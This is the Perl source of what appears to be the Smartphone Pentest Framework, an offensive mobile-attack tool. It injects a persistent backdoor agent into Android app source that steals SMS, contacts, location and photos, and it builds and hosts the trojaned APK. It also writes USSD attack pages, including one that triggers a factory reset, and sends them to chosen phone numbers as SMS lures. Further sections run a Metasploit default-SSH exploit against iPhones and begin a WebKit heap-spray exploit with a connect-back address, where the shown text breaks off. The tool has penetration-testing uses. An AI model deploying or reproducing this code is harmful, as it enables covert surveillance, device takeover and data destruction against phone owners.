#!/usr/bin/perl
use DBI;
use Cwd;
use Expect;
use IO::Socket;
use Device::SerialPort;
$version = "0.1.7";
$configfile = "config";
 open(CONFIG, "+<$configfile");
while (<CONFIG>)
{
	chomp;
	s/#.*//;
	s/^\s+//;
	s/\s+$//;
	($var, $value) = split(/\s*=\s*/, $_, 2);
	$Variables{$var} = ${value};
}
$Variables{"OS"} = $^O;
print "################################################\n";
print "#                                              #\n";
print "# Welcome to the Smartphone Pentest Framework! #\n";
print "#                   v" . $version . "                     #\n";
print "#         Georgia Weidman/Bulb Security        #\n";
print "#                                              #\n";
print "################################################\n";
print "\n\n";
while (1){
	print "Select An Option from the Menu:\n\n";
	print "\t1.) Attach Framework to a Deployed Agent/Create Agent\n";
	print "\t2.) Send Commands to an Agent\n";
	print "\t3.) View Information Gathered\n";
	print "\t4.) Attach Framework to a Mobile Modem\n";
	print "\t5.) Run a remote attack\n";
	print "\t6.) Run a social engineering or client side attack\n";
	print "\t7.) Clear/Create Database\n";
	print "\t8.) Use Metasploit\n";
	print "\t9.) Compile code to run on mobile devices\n";
	print "\t0.) Exit\n";
	print "\n\n";
	print "spf>";
	$choice = <>;
	if ($choice == 1)
	{
		agent_attach2();		
	}
	if ($choice == 2)
	{
		agent_control();
	}
	if ($choice == 3)
	{
		view_data();
	}
	if ($choice == 4)
	{
		add_modem();
	}
	if ($choice == 5)
	{
		remote_attack();
	}
	if ($choice == 6)
	{
		social();
	}
	if ($choice == 7)
	{
		database_clear();
	}
	if ($choice == 8)
	{
		metasplat();
	}
	if ($choice == 9)
	{
		compile();
	}
	if (($choice == "exit") || ($choice == 0))
	{
		exit();
	}
}
sub compile()
{
 	print "Compile code to run on mobile devices\n";
	print "\t1.) Compile C code for ARM Android\n";
	print "spf>";
	$choice3 = <>;
	chomp($choice3);
	if ($choice3 == 1)
	{
		compileandroid();
	}
	if (($choice3 == "exit") || ($choice3 == 0))
	{
		exit();
	}
	
}

sub compileandroid()
{
	$androidarmloc = $Variables{"ANDROIDARMLOC"};
	print "Compiles C code to run on ARM based Android devices. Supply the C code file and the output filename\n";
	print "File to Compile:";
	$inputfile = <>;
	chomp($inputfile);
	print "Output File:";
	$outputfile = <>;
	chomp($outputfile);
	$compilecommand = $androidarmloc . "/bin/arm-linux-androideabi-gcc -static " . $inputfile . " -o " . $outputfile;
	system($compilecommand);
	
}

sub metasplat()
{
print "Run's smartphonecentric Metasploit modules for you.\n";
while (1){
        	print "Select An Option from the Menu:\n\n";
        	print "\t1.) Run iPhone Metasploit Modules\n";
		print "spf>";
 		$choice2 = <>;
        	if ($choice2 == 1)
        	{
                	iphone_meta();
			last;
        	}
		if ($choice2 == 0)
		{
			last;
		}

	}

}
sub iphone_meta()
{
	$metaloc = $Variables{"METASPLOITLOC"};
	$msfcli = $metaloc . "/msfcli";
	if (-e $msfcli)
	{
		while (1){
        	print "Select An Exploit:\n\n";
        	print "\t1.) Cydia Default SSH Password\n";
		print "\t2.) Email LibTiff iOS 1\n";
		print "\t3.) MobileSafari LibTiff iOS 1\n";
		print "spf>";
 		$choice2 = <>;
        	if ($choice2 == 1)
        	{
                	metadefaultpassword();
			last;
        	}
		if ($choice2 == 2)
        	{
                	metaemaillibtiff();
			last;
        	}
		if ($choice2 == 3)
        	{
                	metaemaillibtiff();
			last;
        	}
		if ($choice2 == 0)
		{
			last;
		}
}	
	}
	else
	{
		print "Metasploit not found! Is it installed? Check your config file.\n"
	
}
}

sub metadefaultpassword()
{
	print "Logs in with alpine on a jailbroken iPhone with SSH enabled.\n";
	print "iPhone IP address:";
	$rhost = <>;
	chomp($rhost);
	system($metaloc . "/msfcli exploit/apple_ios/ssh/cydia_default_ssh RHOST=" . $rhost . " E"); 
}

sub metaemaillibtiff()
{
	print "This is for ios 1. I haven't bothered to implement it\n";
}

sub agent_attach2()
{
	while (1){
        	print "Select An Option from the Menu:\n\n";
        	print "\t1.) Attach Framework to a Deployed Agent\n";
        	print "\t2.) Generate Agent App\n";
		print "\t3.) Copy Agent to Web Server\n";
		print "\t4.) Import an Agent Template\n";
		print "spf>";
 		$choice2 = <>;
        	if ($choice2 == 1)
        	{
                	agent_attach();
			last;
        	}
        	if ($choice2 == 2)
        	{
                	choose_build();
			last;
        	}
		if ($choice2 == 3)
		{
			copy_agent();
			last;
		}
		if ($choice2 == 4)
		{
			import_template();
			last;
		}
		if ($choice2 == 0)
		{
			last;
		}

	}

}

sub import_template()
{
	$tempdir = $Variables{"ANDROIDTEMP"};
	$ipaddress = $Variables{"IPADDRESS"};
	$androidagentlocation = $Variables{"ANDROIDAGENT"};
	$androidsdk = $Variables{"ANDROIDSDK"};
	print "Imports source code to backdoor with Agent code\n";
	print "Source Folder:";
	$source = <>;
	chomp($source);
	print "Project Name:";
	$projectname = <>;
	chomp($projectname);
	print "Main Activity including package(ex: com.example.demo.MainActivity):";
	$mainact = <>;
	chomp($mainact);
	$command = "cp -rf " . $source . " " . $tempdir . "/" . $projectname;
	system($command);
	#$addlib = "android.library.reference.1=../AndroidAgent";
	#$propfile = $tempdir . $projectname . "/project.properties";
	#open(PROPFILE, ">>$propfile");
	#print $addlib PROPFILE;
	#close(PROPFILE);
	$mainact =~ s/\./\//g;
	$mainfile = $tempdir . "/" . $projectname . "/src/" . $mainact . ".java"; 
	$inject = <<'EOF';
Intent intent = new Intent(getApplicationContext(), com.bulbsecurity.framework.AndroidAgentActivity.class);
startActivity(intent);
EOF
	$found_onCreate=0;
	$file_contents;	
	open($read_handle,"<",$mainfile);
while (<$read_handle>) {
  if (! $found_onCreate) {
    # skip everything until we find the openCreate
    next unless $_ =~ m/\w+\s+\w*\s+onCreate\s*\(/;
    $found_onCreate = 1;
  }

    if ($found_onCreate && ! $injected_done) {
    next unless $_ =~ m/{/;
    $_ =~ s/{/{\n$inject/;
    $injected_done = 1;
  }

} continue {
  $file_contents.=$_;
}
close $read_handle;

# overwrite file
open(my $write_handle,">",$mainfile);
print $write_handle $file_contents;
close $write_handle;
$manifestfile = $tempdir . "/" . $projectname . "/AndroidManifest.xml";
$inject = <<'EOF';
<receiver android:name="com.bulbsecurity.framework.SMSReceiver">
<intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
</receiver>
<service android:name="com.bulbsecurity.framework.SMSService">
</service>
<receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr">
<intent-filter ><action android:name="android.intent.action.BOOT_COMPLETED"></action></intent-filter>
</receiver>
<receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"></receiver>
<service android:name="com.bulbsecurity.framework.CommandHandler">
</service>
<service android:name="com.bulbsecurity.framework.PingSweep">
</service>
<service android:name="com.bulbsecurity.framework.SMSGet">
</service>
<service android:name="com.bulbsecurity.framework.ContactsGet">
</service>
<service android:name="com.bulbsecurity.framework.InternetPoller">
</service>
<service android:name="com.bulbsecurity.framework.WebUploadService">
</service>
<service android:name="com.bulbsecurity.framework.PictureService">
</service>
<service android:name="com.bulbsecurity.framework.Download">
</service>
<service android:name="com.bulbsecurity.framework.Execute">
</service>
<service android:name="com.bulbsecurity.framework.GetGPS">
</service>
<service android:name="com.bulbsecurity.framework.Checkin">
</service>
<service android:name="com.bulbsecurity.framework.Listener"></service>
<service android:name="com.bulbsecurity.framework.Phase1" android:process=":three">
</service>
<service android:name="com.bulbsecurity.framework.Phase2" android:process=":two">
</service>
<service android:name="com.bulbsecurity.framework.Exynos"></service>
<service android:name="com.bulbsecurity.framework.Upload"></service>
<activity android:name="com.bulbsecurity.framework.AndroidAgentActivity"/>
EOF

# state tracking variable
my $found_onCreate=0;

my $file_contents;

# grab filename from command line

open(my $read_handle,"<",$manifestfile) or die "Couldn't open $file for reading! ($!)";

# loop through each line
while (my $line = <$read_handle>) {
  if (! $found_onCreate) {
    # skip everything until we find the openCreate
    #next unless $line =~ m,</application>,; # this also works
    next unless $line =~ m/<\/application>/;
    print STDERR "found application\n";
    $found_onCreate = 1;
  }

  if ($found_onCreate) {
    #$line =~ s,</application>,$inject</application>,; # this also works
    $line =~ s/<\/application>/$inject<\/application>/;
  }
} continue {
  $file_contents.=$line;
}
close $read_handle;

# overwrite file
open(my $write_handle,">",$manifestfile) or die "Couldn't open $file for writing! ($!)";
print $write_handle $file_contents;
close $write_handle;

$inject = <<'EOF';
   <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.INTERNET" />
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
EOF

# state tracking variable
my $found_onCreate=0;
my $injected_done=0;

my $file_contents;

open(my $read_handle,"<",$manifestfile) or die "Couldn't open $file for reading! ($!)";

# loop through each line
while (my $line = <$read_handle>) {
  if (! $found_onCreate) {
    # skip everything until we find the openCreate
    #next unless $line =~ m,</application>,; # this also works
    next unless $line =~ m/<uses-permission/;
    $found_onCreate = 1;
  }

  if ($found_onCreate && ! $injected_done) {
    #$line =~ s,</application>,$inject</application>,; # this also works
    $line =~ s/<uses-permission/$inject<uses-permission/;
    $injected_done = 1;
  }
} continue {
  $file_contents.=$line;
}
close $read_handle;

# overwrite file
open(my $write_handle,">",$manifestfile) or die "Couldn't open $file for writing! ($!)";
print $write_handle $file_contents;
close $write_handle;


$stringfile = $tempdir . "/" . $projectname . "/res/values/strings.xml";
print $stringfile;
$inject = <<'EOF';
 <string name="key">KEYKEY1</string>
     <string name="controlnumber">155552155554</string>
           <string name="controlIP">192.168.1.108</string>
      <string name="urii">/control</string>
      <string name="controlpath">/androidagent1</string>
EOF

# state tracking variable
my $found_onCreate=0;

my $file_contents;

# grab filename from command line
open(my $read_handle,"<",$stringfile) or die "Couldn't open $file for reading! ($!)";

# loop through each line
while (my $line = <$read_handle>) {
  if (! $found_onCreate) {
    # skip everything until we find the openCreate
    #next unless $line =~ m,</resources>,; # this also works
    next unless $line =~ m/<\/resources>/;
    $found_onCreate = 1;
  }

  if ($found_onCreate) {
    #$line =~ s,</resources>,$inject</resources>,; # this also works
    $line =~ s/<\/resources>/$inject<\/resources>/;
  }
} continue {
  $file_contents.=$line;
}
close $read_handle;

# overwrite file
open(my $write_handle,">",$stringfile) or die "Couldn't open $file for writing! ($!)";
print $write_handle $file_contents;
close $write_handle;


}

sub copy_agent()
{
	$webpath = $Variables{"WEBSERVER"};
	print "Hosting Path:";
	$path = <>;
	print "Filename:";
	$filename = <>;
	chomp($path);
	chomp($filename);
	$fullpath = $webpath. $path;
	$command1 = "mkdir " . $fullpath;
        system($command1);
	$location = $Variables{"ANDROIDAGENT"};
	$command = "cp " . $location . " " . $webpath . $path . $filename;
	system($command);

}

sub choose_build()
{
	while (1){
		#$export = "export PATH=${PATH}:" . $androidsdk . "/tools:" . "/platform-tools";
		#system($export);
		$tempdir = $Variables{"ANDROIDTEMP"};
		$ipaddress = $Variables{"IPADDRESS"};
		$androidagentlocation = $Variables{"ANDROIDAGENT"};
		$androidsdk = $Variables{"ANDROIDSDK"};
		opendir(DIRE, $tempdir);
		@choices = readdir(DIRE);
		closedir(DIRE);
		print "Choose an app template build\n\n";
		$choiceslength = @choices;
		for($i = 0; $i <= ($choiceslength); $i++) {
			if (@choices[$i] eq "." || @choices[$i] eq ".." || @choices[$i] eq "AndroidAgent")
			{
				splice(@choices,$i,1);
				$i--;
			}
		}
		$choiceslength = @choices;
		for($i = 1; $i <= $choiceslength; $i++) {
			print "\t" . $i . ".) " . @choices[($i - 1)] . "\n";
		}
		print "\n\n";
		print "spf>";
		$choice1 = <>;
		if ($choice1 == 0)
		{
			return;
		}
		else 
		{
			$pick = ($choice1 - 1);
			if ($pick < $choiceslength)
			{
				$partpath = @choices[$pick];
				$fullpath1 = $tempdir . "/" . $partpath . "/res/values/strings.xml";
				$export = "export PATH=${PATH}:" . $androidsdk . "/tools:" . "/platform-tools";
				system($export);
				print "Phone number of the control modem for the agent:";
				$controlphone = <>;
                		chomp($controlphone);
				print "Control key for the agent:";
                		$controlkey = <>;
                		chomp($controlkey);
	        		print "Webserver control path for agent:";
                		$controlpath = <>;
                		chomp($controlpath);
                		print "\n\nControl Number:" .  $controlphone .  "\nControl Key:" . $controlkey . "\nControlPath:" . $controlpath . "\nIs this correct?(y/n)";
                		$correct = <>;
                		chomp($correct);
                		if (lc($correct) eq "y")
                		{
				#$command = "sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" . $controlkey . "</string>/' " . $fullpath1;
				$command = "sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" . $controlkey . "<\\/string>/' " . $fullpath1; 
				system($command);
				$command = "sed -i \'s/\<string name=\"controlnumber\">.*/<string name=\"controlnumber\">" . $controlphone . "<\\/string>/' " . $fullpath1; 
				system($command);
				$command = "sed -i \'s/<string name=\"controlIP\">.*/<string name=\"controlIP\">" . $ipaddress . "<\\/string>/' " . $fullpath1; 
				system($command);
				$command = "sed -i \'s/<string name=\"controlpath\">.*/<string name=\"controlpath\">\\" . $controlpath . "<\\/string>/' " . $fullpath1; 
				system($command);
				$agentsrc = $tempdir . "/" . $partpath;
				$command = $androidsdk . "/tools/android update project --path " . $tempdir . "\/AndroidAgent" . " --target \"Google Inc.:Google APIs:4\"";
				system($command);
				$command = $androidsdk . "/tools/android update project --path " . $agentsrc . " --target \"Google Inc.:Google APIs:4\" --library ../AndroidAgent";
			system($command);
			$command = $androidsdk . "/tools/android update project --name " . @choices[$pick] . " --path ". $agentsrc;
			system($command);
			$command = "ant -f " . $agentsrc .  "/build.xml clean debug";
			system($command);
			$command = "cp " . $agentsrc . "/bin/" . $partpath . "-debug-unaligned.apk " . $androidagentlocation;
			system($command);

				}
			}
		}
	}
}



sub database_clear()
{
	print "This will destroy all your data. Are you sure you want to? (y/N)?";
	$yes = <>;
	chomp($yes);
	if (lc($yes) eq "y")
	{
		$sqlserver = $Variables{"MYSQLSERVER"};
		$username = $Variables{"MYSQLUSER"};
		$password = $Variables{"MYSQLPASS"};
		$port = $Variables{"MYSQLPORT"};
		$type = $Variables{"DATABASETYPE"};
		$dropquery1 = "DROP TABLE IF EXISTS agents";
		$dropquery2 = "DROP TABLE IF EXISTS data";
		$dropquery3 = "DROP TABLE IF EXISTS modems";
		   $dropquery4 = "DROP TABLE IF EXISTS remote";
                $dropquery5 = "DROP TABLE IF EXISTS client";
		if ($type eq "postgres")
		{
			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port","$username","$password");
			 if (! defined $dbh)
                        {
                                print "Database doesn't exist.
 Creating it\n";
                                $makecommand = "sudo su postgres -c psql -c \"createdb framework\"";
                                system($makecommand);
				$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port","$username","$password");
			}

			 $createquery1 = "create table agents (id SERIAL NOT NULL PRIMARY KEY, number varchar(12),path varchar(1000), controlkey varchar(7), controlnumber varchar(12), platform varchar(12))";
                        $createquery2 = "create table data (id SERIAL NOT NULL PRIMARY KEY, sms varchar(2000),contacts varchar(1000), picture varchar(100), root varchar(50)), ping varchar(2000), file varchar(100)";
                        $createquery3 = "create table modems (id SERIAL NOT NULL PRIMARY KEY, number varchar(12), path varchar(1000), controlkey varchar(7), type varchar(3))";
                        $createquery4 = "create table remote (id SERIAL NOT NULL PRIMARY KEY, ip varchar(15), exploit varchar(200), vuln varchar(3), agent varchar(3))";
                        $createquery5 = "create table client (id SERIAL NOT NULL PRIMARY KEY, number varchar(12), exploit varchar(200), vuln varchar(3))";
	
		}
		elsif ($type eq "mysql")
		{	
                	$createquery1 = "create table agents (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(15),path varchar(1000), controlkey varchar(7), controlnumber varchar(12), platform varchar(12))";
                	$createquery2 = "create table data (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, sms varchar(2000),contacts varchar(1000), picture varchar(100), root varchar(5),ping varchar(2000), file varchar(100))";
                	$createquery3 = "create table modems (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(12), path varchar(1000), controlkey varchar(7), type varchar(3))";
                	$createquery4 = "create table remote (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, ip varchar(15), exploit varchar(200), vuln varchar(3), agent varchar(3))";
                	$createquery5 = "create table client (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(12), exploit varchar(200), vuln varchar(3))";
			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
			if (! defined $dbh)
			{
				print "Database doesn't exist. Creating it\n";
				$makecommand = "mysqladmin -u " . $username . " create framework -p" . $password;
				system($makecommand);
				$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
			}
		}
		$sql = $dbh->prepare($dropquery1);
		$sql->execute;
		$sql = $dbh->prepare($dropquery2);
		$sql->execute;
		$sql = $dbh->prepare($dropquery3);
		$sql->execute;
		 $sql = $dbh->prepare($dropquery4);
                $sql->execute;
                $sql = $dbh->prepare($dropquery5);
                $sql->execute;
		$sql = $dbh->prepare($createquery1);
       		$sql->execute;
       		$sql = $dbh->prepare($createquery2);
        	$sql->execute;
        	$sql = $dbh->prepare($createquery3);
        	$sql->execute;
		$sql = $dbh->prepare($createquery4);
                $sql->execute;
 		$sql = $dbh->prepare($createquery5);
                $sql->execute;

	}

}

sub social
{
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
	$ipaddress = $Variables{"IPADDRESS"};
        while(1)
        {
                print "\n\nChoose a social engineering or client side attack to launch:\n";
                print "\t1.) Direct Download Agent\n";
		print "\t2.) Client Side Shell\n";
		print "\t3.) USSD Webpage Attack (Safe)\n";
		print "\t4 ) USSD Webpage Attack (Malicious)\n";
                print "spf>";
                $choice1 = <>;
                chomp($choice1);
 		if ($choice1 == 1)
                {
                        direct_download();
			last;
                }
		if ($choice1 == 2)
		{
			client_side();
			last;
		}
		if ($choice1 == 3)
		{
			ussdsafe();
			last;
		}
		if ($choice1 == 4)
		{
			ussddangerous();
			last;
		}
                if (($choice1 == "exit") || ($choice1 == 0))
                {
                        return;
                }

	}
}




sub ussddangerous
{

	 $webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	print "WARNING: THIS CAN FACTORY RESET YOUR PHONE IF VULNERABLE.\nFOR PROOF OF CONCEPT USE ONLY! \nUSE THE SAFE VERSION ON PENTESTS\n";
	print "Hosting Path:";
                        $path = <>;
                        print "Filename:";
                        $filename = <>;
                        print "Phone Number to Attack:";
                        $number = <>;
                        chomp($number);
                        chomp($platform);
                        chomp($path);
                        chomp($filename);
                        $link = "http://" . $ipaddress . $path . $filename;
                        $fullpath = $webserver. $path;
                        $command1 = "mkdir " . $fullpath;
                        system($command1);
			$sploitfile = $webserver . $path . $filename;
                        $command8 = "touch " . $sploitfile;
                        system($command8);
                        $command9 = "chmod 777 " . $sploitfile;
                        system($command9);
                        open(SPLOITFILE, ">$sploitfile");
                        print SPLOITFILE "<html>\n";
			print SPLOITFILE "<head>\n";
			$sploit2 = "/redirect.html";
			$sploitfile2 = $webserver . $path . $sploit2;
			print SPLOITFILE "<meta http-equiv=\"refresh\" content=\"1;url=http://" . $ipaddress  . $path . $sploit2 . "\">\n";
			print SPLOITFILE "</head>\n";
			print SPLOITFILE "<frameset>\n";
			print SPLOITFILE "<frame src=\"tel:*2767*3855%23\" />\n";
			print SPLOITFILE "</frameset>\n";
			print SPLOITFILE "</html>\n";
			close(SPLOITFILE);
			$command8 = "touch " . $sploitfile2;
                        system($command8);
                        $command9 = "chmod 777 " . $sploitfile2;
                        system($command9);
                        open(SPLOITFILE2, ">$sploitfile2");
                        print SPLOITFILE2 "<html>\n";
                       	print SPLOITFILE2 "<frameset>\n";
                        print SPLOITFILE2 "<frame src=\"tel:*2767*3855%23\" />\n";
                        print SPLOITFILE2 "</frameset>\n";
                        print SPLOITFILE2 "</html>\n";
			close(SPLOITFILE2);
			  $modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use 
this functionality\n";
                        }
                         else
                        {
                                $username = $Variables{"MYSQLUSER"};
                                $password = $Variables{"MYSQLPASS"};
                                $port = $Variables{"MYSQLPORT"};
                                 $type = $Variables{"DATABASETYPE"};
                                if ($type eq "postgres")
                                {
                                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
                                }
                                elsif ($type eq "mysql")
                                {     
                                        $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                }
                                $pathquery = "SELECT path from modems where id=" . $modem;
                                $sql = $dbh->prepare($pathquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
                                $keyquery = "SELECT controlkey from modems where id=" . $modem;
                                $sql = $dbh->prepare($keyquery);
                                $results2 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];
                                $modemtypequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
					$usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $numberline = "AT+CMGS=\"" . $number . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $msg = "This is a cool page: " . $link; 
                                        $usb->write($msg.pack('c',26));
                                        sleep(2);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
					   $usb->close();

                                }
                                elsif ($modemtype2 eq "app") 
                                {
                                        $control = $webserver . $path2 . "/getfunc";
                                        open(CONTROLFILE, ">$control");
                                        $command2 = $key2 . " " . "SEND" . " " . $number . " " . "This is a cool page: " . $link;
                                        print CONTROLFILE $command2;
                                        close(CONTROLFILE);
                                }
 		}                      
					
}

sub ussdsafe
{

	 $webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	print "Hosting Path:";
                        $path = <>;
                        print "Filename:";
                        $filename = <>;
                        print "Phone Number to Attack:";
                        $number = <>;
                        chomp($number);
                        chomp($platform);
                        chomp($path);
                        chomp($filename);
                        $link = "http://" . $ipaddress . $path . $filename;
                        $fullpath = $webserver. $path;
                        $command1 = "mkdir " . $fullpath;
                        system($command1);
			$sploitfile = $webserver . $path . $filename;
                        $command8 = "touch " . $sploitfile;
                        system($command8);
                        $command9 = "chmod 777 " . $sploitfile;
                        system($command9);
                        open(SPLOITFILE, ">$sploitfile");
                        print SPLOITFILE "<html>\n";
			print SPLOITFILE "<head>\n";
			$sploit2 = "/redirect.html";
			$sploitfile2 = $webserver . $path . $sploit2;
			print SPLOITFILE "<meta http-equiv=\"refresh\" content=\"1;url=http://" . $ipaddress  . $path . $sploit2 . "\">\n";
			print SPLOITFILE "</head>\n";
			print SPLOITFILE "<frameset>\n";
			print SPLOITFILE "<frame src=\"tel:*%2306%23\" />\n";
			print SPLOITFILE "</frameset>\n";
			print SPLOITFILE "</html>\n";
			close(SPLOITFILE);
			$command8 = "touch " . $sploitfile2;
                        system($command8);
                        $command9 = "chmod 777 " . $sploitfile2;
                        system($command9);
                        open(SPLOITFILE2, ">$sploitfile2");
                        print SPLOITFILE2 "<html>\n";
                       	print SPLOITFILE2 "<frameset>\n";
                        print SPLOITFILE2 "<frame src=\"tel:*%2306%23\" />\n";
                        print SPLOITFILE2 "</frameset>\n";
                        print SPLOITFILE2 "</html>\n";
			close(SPLOITFILE2);
			  $modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use 
this functionality\n";
                        }
                         else
                        {
                                $username = $Variables{"MYSQLUSER"};
                                $password = $Variables{"MYSQLPASS"};
                                $port = $Variables{"MYSQLPORT"};
                                 $type = $Variables{"DATABASETYPE"};
                                if ($type eq "postgres")
                                {
                                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
                                }
                                elsif ($type eq "mysql")
                                {     
                                        $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                }
                                $pathquery = "SELECT path from modems where id=" . $modem;
                                $sql = $dbh->prepare($pathquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
                                $keyquery = "SELECT controlkey from modems where id=" . $modem;
                                $sql = $dbh->prepare($keyquery);
                                $results2 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];
                                $modemtypequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
					$usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $numberline = "AT+CMGS=\"" . $number . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $msg = "This is a cool page: " . $link; 
                                        $usb->write($msg.pack('c',26));
                                        sleep(2);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
					   $usb->close();

                                }
                                elsif ($modemtype2 eq "app") 
                                {
                                        $control = $webserver . $path2 . "/getfunc";
                                        open(CONTROLFILE, ">$control");
                                        $command2 = $key2 . " " . "SEND" . " " . $number . " " . "This is a cool page: " . $link;
                                        print CONTROLFILE $command2;
                                        close(CONTROLFILE);
                                }
 		}                      
					
}

sub client_side
{
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	$shellipaddress = $Variables{"SHELLIPADDRESS"};
	while(1)
	{
		print "Select a Client Side Attack to Run\n";
		print "\t1) CVE=2010-1759 Webkit Vuln Android\n";
		print "spf>";
		$choice1 = <>;
		  if (($choice1 == "exit") || ($choice1 == 0))
                {
                      return;
                }
		if ($choice1 == 1)
		{
			print "Hosting Path:";
                	$path = <>;
                	print "Filename:";
                	$filename = <>;
			print "Delivery Method(SMS or NFC):";
			$method = <>;
			chomp($method);
			if (lc($method) eq "sms")
			{
                	print "Phone Number to Attack:";
                	$number = <>;
                	chomp($number);
			print "Custom text(y/N)?";
			$custom = <>;
			chomp($custom);
			}
                	chomp($platform);
                	chomp($path);
                	chomp($filename);
			$link = "http://" . $ipaddress . $path . $filename;
                	$fullpath = $webserver. $path;
                	$command1 = "mkdir " . $fullpath;
                	system($command1);
			$ipaddresscopy = $shellipaddress;
			@octets = split(/\./, $ipaddresscopy);
			$out1 = pack "c", @octets[0];
			$hex1 = unpack "H2" , $out1;
			$out2 = pack "c", @octets[1];
                	$hex2 = unpack "H2" , $out2;
			$out3 = pack "c", @octets[2];
                	$hex3 = unpack "H2" , $out3;
  			$out4 = pack "c", @octets[3];
                	$hex4 = unpack "H2" , $out4;
			$sploitfile = $webserver . $path . $filename;
			$command8 = "touch " . $sploitfile;
       		 	system($command8);
        		$command9 = "chmod 777 " . $sploitfile;
        		system($command9);
        		open(SPLOITFILE, ">$sploitfile");
       			print SPLOITFILE "<html>\n";
			print SPLOITFILE "<head>\n";
			print SPLOITFILE "<script>\n"; 
			print SPLOITFILE "var ip = unescape(\"\\u" . $hex2 . $hex1 . "\\u" . $hex4 . $hex3 . "\");\n";
			print SPLOITFILE "var port = unescape(\"\\u3930\");\n";
			print SPLOITFILE "function trigger()\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "var span = document.createElement(\"div\");\n";
			print SPLOITFILE "document.getElementById(\"BodyID\").appendChild(span);\n";
			print SPLOITFILE "span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n"; 
			print SPLOITFILE "}\n";
			print SPLOITFILE "function exploit()\n";
			print SPLOITFILE "{\n";   
			print SPLOITFILE "var nop = unescape(\"\\u33bc\\u0057\");\n";
			print SPLOITFILE "do\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "nop+=nop;\n";
			print SPLOITFILE "} while (nop.length<=0x1000);\n";
